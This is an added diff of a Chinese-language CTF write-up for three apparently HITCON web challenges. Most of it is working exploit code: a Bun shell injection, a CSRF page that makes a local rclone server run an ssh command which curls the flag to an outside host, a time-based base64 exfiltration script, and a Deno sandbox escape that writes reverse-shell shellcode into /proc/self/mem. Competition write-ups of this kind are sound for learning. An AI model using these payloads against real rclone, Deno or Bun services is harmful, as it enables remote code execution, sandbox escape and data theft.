@@ -1,0 +1,355 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h1 data-content="1" id="3d959ca95cdaab16f754cc741e5f1f04">Echo as a Service</h1>
+<p>这里先放出源码</p>
+<pre><code>import { $ } from "bun";
+
+const server = Bun.serve({
+    host: "0.0.0.0",
+    port: 1337,
+    async fetch(req) {
+        const url = new URL(req.url);
+        if (url.pathname === "/") {
+            return new Response(`
+                &lt;p&gt;Welcome to echo-as-a-service! Try it out:&lt;/p&gt;
+                &lt;form action="/echo" method="POST"&gt;
+                    &lt;input type="text" name="msg" /&gt;
+                    &lt;input type="submit" value="Submit" /&gt;
+                &lt;/form&gt;
+            `.trim(), { headers: { "Content-Type": "text/html" } });
+        }
+        else if (url.pathname === "/echo") {
+            const msg = (await req.formData()).get("msg");
+            if (typeof msg !== "string") {
+                return new Response("Something's wrong, I can feel it", { status: 400 });
+            }
+
+            const output = await $`echo ${msg}`.text();
+            return new Response(output, { headers: { "Content-Type": "text/plain" } });
+        }
+    }
+});
+
+console.log(`listening on http://localhost:${server.port}`);</code></pre>
+<p>这里因为题目describe说要RCE所以这里直接能定位到</p>
+<pre><code>const output = await $`echo ${msg}`.text();
+            return new Response(output, { headers: { "Content-Type": "text/plain" } });
+        }
+    }
+});</code></pre>
+<p>这里通过bun的docs<br/>
+对比一下当前版本和1.1.8版本在使用shell的区别</p>
+<pre><code>当前
+{ '~', '[', ']', '#', ';', '\n', '*', '{', ',', '}', '`',
+'$', '=', '(', ')', '0', '1', '2', '3', '4', '5', '6', '7',
+'8', '9', '|', '&gt;', '&lt;', '&amp;', '\'', '"', ' ', '\\' }
+1.1.8
+{ '$', '&gt;', '&amp;', '|', '=', ';', '\n', '{', '}',
+',', '(', ')', '\\', '\"', ' ', '\'' }</code></pre>
+<p>可以看见可以进行subshell，并且可以利用&lt;来写入文件<br/>
+所以就这样</p>
+<pre><code>/readflag give me the flag1&lt;test</code></pre>
+<p>最终脚本</p>
+<div class="highlight"><pre><span></span><span class="n">cmd</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'/readflag</span><span class="se">\t</span><span class="s1">give</span><span class="se">\t</span><span class="s1">me</span><span class="se">\t</span><span class="s1">the</span><span class="se">\t</span><span class="s1">flag1&lt;flag.sh'</span><span class="p">,</span> <span class="s1">'`sh&lt;flag.sh`'</span><span class="p">]</span>
+<span class="p">[</span><span class="k">print</span><span class="p">(</span><span class="nb">__import__</span><span class="p">(</span><span class="s2">"requests"</span><span class="p">)</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">"http://192.168.174.128:32768/echo"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">'msg'</span><span class="p">:</span> <span class="n">cmd</span><span class="p">[</span><span class="n">x</span><span class="p">]})</span><span class="o">.</span><span class="n">text</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">)]</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240726114838-f12ae4da-4b01-1.png"/></p>
+<p>可以看到读到了。</p>
+<h1 data-content="1" id="90721f031a34570d864f10db8e15fdef">RClonE</h1>
+<p>题目描述</p>
+<div class="highlight"><pre><span></span>Rclone is a CLI that syncs your files to various cloud storage. But do you know it also have a built-in web UI?
+</pre></div>
+<p>然后这里我们主要看一下大概的逻辑<br/>
+bot.js</p>
+<pre><code>const visit = async url =&gt; {
+    let context = null
+    try {
+        if (!browser) {
+            const args = ['--js-flags=--jitless,--no-expose-wasm', '--disable-gpu', '--disable-dev-shm-usage']
+            if (new URL(SITE).protocol === 'http:') {
+                args.push(`--unsafely-treat-insecure-origin-as-secure=${SITE}`)
+            }
+            browser = await puppeteer.launch({
+                headless: 'new',
+                args
+            })
+        }
+
+        context = await browser.createBrowserContext()
+
+        const page1 = await context.newPage()
+        await page1.goto(LOGIN_URL)
+        await page1.close()
+
+        const page2 = await context.newPage()
+        await Promise.race([
+            page2.goto(url, {
+                waitUntil: 'networkidle0'
+            }),
+            sleep(5000)
+        ])
+        await page2.close()
+
+        await context.close()
+        context = null
+    } catch (e) {
+        console.log(e)
+    } finally {
+        if (context) await context.close()
+    }
+}</code></pre>
+<p>app.js</p>
+<pre><code>app.get('/', (req, res) =&gt; {
+    res.send(INDEX_HTML)
+})
+app.post('/submit', async (req, res) =&gt; {
+    const { url } = req.body
+    if (!url || !URL_CHECK_REGEX.test(url)) {
+        return res.status(400).send('Invalid URL')
+    }
+
+    try {
+        console.log(`[+] Sending ${url} to bot`)
+        await visit(url)
+        res.send('OK')
+    } catch (e) {
+        console.log(e)
+        res.status(500).send('Something is wrong...')
+    }
+})</code></pre>
+<p>这里我们搭建起来环境</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240726114851-f8cc6d44-4b01-1.png"/></p>
+<p>可以看到是一个传url的地方，这里盲猜一下是ssrf，因为一般都出现在这种请求当中，并且我们可以发现源码并没有对其做过滤。<br/>
+这里我们用webhook测试一下</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240726114901-fea30c5a-4b01-1.png"/></p>
+<p>可以看到是做了一个请求的。<br/>
+<a href="https://rclone.org/sftp/#sftp-ssh" target="_blank">https://rclone.org/sftp/#sftp-ssh</a><br/>
+然后通过这个rclone官网可以看见我们可以利用sftp去在ssh执行命令的。所以我们可以先创建一个远程的SFTP地址。<br/>
+然后如果我们需要创建一个remote的SFTP服务，我们可以通过请求这个路由来进行创建<a href="http://xxxx:5527/config/creat" target="_blank">http://xxxx:5527/config/creat</a></p>
+<div class="highlight"><pre><span></span>curl -X POST -d <span class="s1">'{"name": "my_sftp_remote", "type": "sftp", "parameters": {"host": "sftp.example.com", "user": "username", "pass": "password"}}'</span> http://localhost:5572/config/create
+</pre></div>
+<p>这样子我们就可以创建一个remote，然后我们写成html可以这样</p>
+<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">"http://192.168.174.128:5572/config/create"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span> <span class="na">id</span><span class="o">=</span><span class="s">"cfgform"</span> <span class="na">target</span><span class="o">=</span><span class="s">"_blank"</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">"name"</span> <span class="na">value</span><span class="o">=</span><span class="s">"yy"</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">"type"</span> <span class="na">value</span><span class="o">=</span><span class="s">"sftp"</span> <span class="p">/&gt;</span>
+    <span class="c">&lt;!-- https://github.com/rclone/rclone/blob/7b8bbe531e0f062254b2d8ffe1e6284cd62309f6/fs/config/rc.go#L150 will parse parameters using json.Unmarshal --&gt;</span>
+    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">"parameters"</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;</span><span class="nt">button</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span><span class="p">&gt;</span>Create<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+    <span class="nx">cfgform</span><span class="p">.</span><span class="nx">parameters</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span>
+        <span class="c1">// ssh: 'bash -c "touch /tmp/pwned"'</span>
+        <span class="nx">ssh</span><span class="o">:</span> <span class="sb">`bash -c "curl http://192.168.174.128:8080/submit -d url=http://</span><span class="si">${</span><span class="nx">location</span><span class="p">.</span><span class="nx">host</span><span class="si">}</span><span class="sb">/flag?flag=$(/readflag)"`</span>
+    <span class="p">})</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</pre></div>
+<p>然后后面的js是为了把ssh要执行的命令先写进去然后在后面访问的时候让他自动触发</p>
+<div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">"http://192.168.174.128:5572/operations/list"</span> <span class="na">method</span><span class="o">=</span><span class="s">"POST"</span> <span class="na">id</span><span class="o">=</span><span class="s">"listform"</span> <span class="na">target</span><span class="o">=</span><span class="s">"_blank"</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">"fs"</span> <span class="na">value</span><span class="o">=</span><span class="s">"yy:"</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">"remote"</span> <span class="na">value</span><span class="o">=</span><span class="s">""</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;</span><span class="nt">button</span> <span class="na">type</span><span class="o">=</span><span class="s">"submit"</span><span class="p">&gt;</span>Do List<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+    <span class="nx">cfgform</span><span class="p">.</span><span class="nx">submit</span><span class="p">()</span>
+    <span class="nx">setTimeout</span><span class="p">(()</span> <span class="p">=&gt;</span> <span class="p">{</span>
+        <span class="nx">listform</span><span class="p">.</span><span class="nx">submit</span><span class="p">()</span>
+    <span class="p">},</span> <span class="mi">1500</span><span class="p">)</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">"/delay.php?seconds=5"</span> <span class="p">/&gt;</span>
+<span class="c">&lt;!-- hitcon{easy_peasy_rce_using_csrf_attacking_local_server} --&gt;</span>
+</pre></div>
+<p>这样子就会触发让他执行上面写的ssh命令然后把内容外带出来。</p>
+<p>然后另外一个队伍的wp是这么写的，因为rclone不出网所以利用二分法进去把flag leak出来</p>
+<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">base64</span>
+<span class="kn">import</span> <span class="nn">time</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s2">"http://rclone.chal.hitconctf.com:30068/submit"</span>
+
+<span class="c1"># run it first</span>
+<span class="c1"># php -S 0.0.0.0:3000 exp.html</span>
+
+<span class="n">exp1</span> <span class="o">=</span> <span class="s2">"""</span>
+<span class="s2">&lt;form id="rce" method="post" action="http://rclone:5572/config/create"&gt;</span>
+<span class="s2">    &lt;input name="name" value="u"&gt;</span>
+<span class="s2">    &lt;input name="type" value="webdav"&gt;</span>
+<span class="s2">    &lt;input name="parameters" value='{{"bearer_token_command":"{}", "url":"http://bot:8000"}}'&gt;</span>
+<span class="s2">&lt;/form&gt;</span>
+<span class="s2">&lt;script&gt;</span>
+<span class="s2">    rce.submit();</span>
+<span class="s2">&lt;/script&gt;</span>
+<span class="s2">"""</span>
+
+<span class="n">exp2</span> <span class="o">=</span> <span class="s2">"""</span>
+<span class="s2">&lt;form id="form" method="post" action="http://rclone:5572/operations/list"&gt;</span>
+<span class="s2">    &lt;input type="hidden" name="fs" value="u:" /&gt;</span>
+<span class="s2">    &lt;input type="hidden" name="remote" value="" /&gt;</span>
+<span class="s2">  &lt;/form&gt;</span>
+<span class="s2">  &lt;script&gt;</span>
+<span class="s2">      form.submit();</span>
+<span class="s2">  &lt;/script&gt;</span>
+<span class="s2">    """</span>
+
+
+<span class="n">flag</span> <span class="o">=</span> <span class="s2">"aGl0Y29ue2Vhc3lfcGVhc3lfcmNlX3VzaW5nX2NzcmZfYXR0YWNraW5nX2xvY2FsX3"</span>
+<span class="n">wordlist</span> <span class="o">=</span> <span class="s2">"+/0123456789=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"</span>
+
+
+<span class="k">def</span> <span class="nf">foo</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">opt</span><span class="p">):</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">"exp.html"</span><span class="p">,</span> <span class="s2">"w"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="n">f</span><span class="s2">"[[ $(/readflag|base64) {opt} {flag}{c}* ]] &amp;&amp; sleep 5"</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="n">f</span><span class="s2">"bash -c {{echo,{payload}}}|{{base64,-d}}|{{bash,-i}}"</span>
+        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">exp1</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">"url"</span><span class="p">:</span> <span class="s2">"https://dev.vincent55.tw"</span><span class="p">})</span>
+
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">"exp.html"</span><span class="p">,</span> <span class="s2">"w"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">exp2</span><span class="p">)</span>
+
+    <span class="n">start</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+    <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">"url"</span><span class="p">:</span> <span class="s2">"https://dev.vincent55.tw"</span><span class="p">})</span>
+    <span class="n">end</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+    <span class="k">if</span> <span class="n">end</span> <span class="o">-</span> <span class="n">start</span> <span class="o">&gt;</span> <span class="mi">4</span><span class="p">:</span>
+        <span class="k">return</span> <span class="bp">True</span>
+    <span class="k">return</span> <span class="bp">False</span>
+
+
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="n">lb</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
+    <span class="n">rb</span> <span class="o">=</span> <span class="mi">65</span>
+
+    <span class="k">while</span> <span class="n">lb</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">&lt;</span> <span class="n">rb</span><span class="p">:</span>
+        <span class="n">m</span> <span class="o">=</span> <span class="p">(</span><span class="n">lb</span> <span class="o">+</span> <span class="n">rb</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
+        <span class="k">if</span> <span class="n">foo</span><span class="p">(</span><span class="n">wordlist</span><span class="p">[</span><span class="n">m</span><span class="p">],</span> <span class="s2">"&gt;"</span><span class="p">):</span>
+            <span class="n">lb</span> <span class="o">=</span> <span class="n">m</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">rb</span> <span class="o">=</span> <span class="n">m</span>
+    <span class="n">flag</span> <span class="o">+=</span> <span class="n">wordlist</span><span class="p">[</span><span class="n">lb</span><span class="p">]</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+</pre></div>
+<h1 data-content="1" id="804bd4941ffb19d3af20de915568a39d">Truth of NPM</h1>
+<p>首先我们看到query.tsx文件中有这么一个函数</p>
+<pre><code>async function queryPackage(packageName: string) {
+    if (cache.has(packageName)) {
+        return cache.get(packageName) as CachedPackageQueryResult
+    }
+    const pkgjson: PackageJson | null = await (async () =&gt; {
+        try {
+            const module = await import(`npm:${packageName}/package.json`, {
+                with: {
+                    type: 'json'
+                }
+            })
+            return module.default
+        } catch {
+            return null
+        }
+    })()
+    if (!pkgjson) {
+        const ps = await asyncMapToArray(walkPackageFiles(npmDir), entry =&gt; Deno.remove(entry.path))
+        await Promise.all(ps)
+        return null
+    }
+    let totalSize = 0
+    const ps = await asyncMapToArray(walkPackageFiles(npmDir), async entry =&gt; {
+        const { size } = await Deno.stat(entry.path)
+        totalSize += size
+        return Deno.remove(entry.path)
+    })
+    await Promise.all(ps)
+    const ret = { size: totalSize, pkgjson }
+    cache.set(packageName, ret)
+    return ret
+}</code></pre>
+<p>这里我们可以看到</p>
+<pre><code>const module = await import(`npm:${packageName}/package.json`, {
+                with: {
+                    type: 'json'
+                }
+            })</code></pre>
+<p>这里他会自动import一个包，这个包可以是remote的。<br/>
+然后在import完之后</p>
+<pre><code>if (!pkgjson) {
+        const ps = await asyncMapToArray(walkPackageFiles(npmDir), entry =&gt; Deno.remove(entry.path))
+        await Promise.all(ps)
+        return null
+    }</code></pre>
+<p>他就会删掉原来的你install包中的文件，但是因为这个删除用的是这个函数<code>fs.walk</code></p>
+<pre><code>async function* walkPackageFiles(npmDir: string) {
+    for await (const entry of fs.walk(npmDir)) {
+        if (entry.isDirectory) continue
+        // registry.json is generated by deno
+        if (entry.name !== 'registry.json') {
+            yield entry
+        }
+    }
+}</code></pre>
+<p>他的特性就是会保留非utf-8编码的文件即tsx文件。<br/>
+然后在main函数中</p>
+<pre><code>import { Hono, Context } from 'hono'
+import { rateLimiter } from './utils.ts'
+
+const app = new Hono()
+
+app.use(rateLimiter(1))
+app.use(async (c: Context) =&gt; {
+    const page = c.req.path.slice(1) || 'index'
+    try {
+        const { handler } = await import(`./pages/${page}.tsx`)
+        return handler(c)
+    } catch {
+        return c.html('404 Not Found', 404)
+    }
+})
+
+export default app</code></pre>
+<p>你访问你包的名称就会自动import下来，就可以执行命令了，但是我们都是在Deno的沙箱中的，所以我们要执行命令的话要绕一下沙箱<br/>
+这里具体还没研究透怎么绕的呜呜呜还得花点时间<br/>
+exp.tsx</p>
+<pre><code>export const handler = async c-&gt;{
+    const body = await c.req.text()
+    return c.text(eval(body))
+}</code></pre>
+<p>exp.js（绕沙箱）</p>
+<pre><code>try {
+    Deno.removeSync('/tmp/self')
+} catch {}
+Deno.symlinkSync('/proc/self', '/tmp/self') // bypass https://github.com/denoland/deno/security/advisories/GHSA-23rx-c3g5-hv9w
+const maps = Deno.readTextFileSync('/tmp/self/maps')
+const first = maps.split('\n').find(x =&gt; x.includes('deno'))
+const offset = 0x401c2c0 // p &amp;Builtins_JsonStringify-0x555555554000
+const base = parseInt(first.split('-')[0], 16)
+const addr = base + offset
+console.log('&amp;Builtins_JsonStringify', addr.toString(16))
+
+const mem = Deno.openSync('/tmp/self/mem', {
+    write: true
+})
+
+/*
+from pwn import *
+context.arch = 'amd64'
+sc = asm(shellcraft.connect('127.0.0.1', 3535, 'ipv4') + shellcraft.dupsh())   
+print(list(sc))
+*/
+
+const shellcode = new Uint8Array([
+    106, 41, 88, 106, 2, 95, 106, 1, 94, 153, 15, 5, 72, 137, 197, 72, 184, 1, 1, 1, 1, 1, 1, 1, 2, 80, 72, 184, 3, 1,
+    12, 206, 126, 1, 1, 3, 72, 49, 4, 36, 106, 42, 88, 72, 137, 239, 106, 16, 90, 72, 137, 230, 15, 5, 72, 137, 239,
+    106, 2, 94, 106, 33, 88, 15, 5, 72, 255, 206, 121, 246, 106, 104, 72, 184, 47, 98, 105, 110, 47, 47, 47, 115, 80,
+    72, 137, 231, 104, 114, 105, 1, 1, 129, 52, 36, 1, 1, 1, 1, 49, 246, 86, 106, 8, 94, 72, 1, 230, 86, 72, 137, 230,
+    49, 210, 106, 59, 88, 15, 5
+])
+mem.seekSync(addr, Deno.SeekMode.Start)
+mem.writeSync(shellcode)
+JSON.stringify('pwned')
+
+/*
+1. create a npm package with filename includes invalid utf-8 and publish  (tar czf package.tar.gz exppkg &amp;&amp; npm publish package.tar.gz --access public)
+2. curl 'http://localhost:8000/query?package=@maple3142/exploit_of_truth_of_npm'
+3. curl --path-as-is 'http://localhost:8000/../../deno-dir/npm/registry.npmjs.org/@maple3142/exploit_of_truth_of_npm/0.0.1/exp%ff' -T exp.js
+*/
+// hitcon{the_fix_that_does_not_really_address_the_issue}</code></pre>
+</div>
+</div>
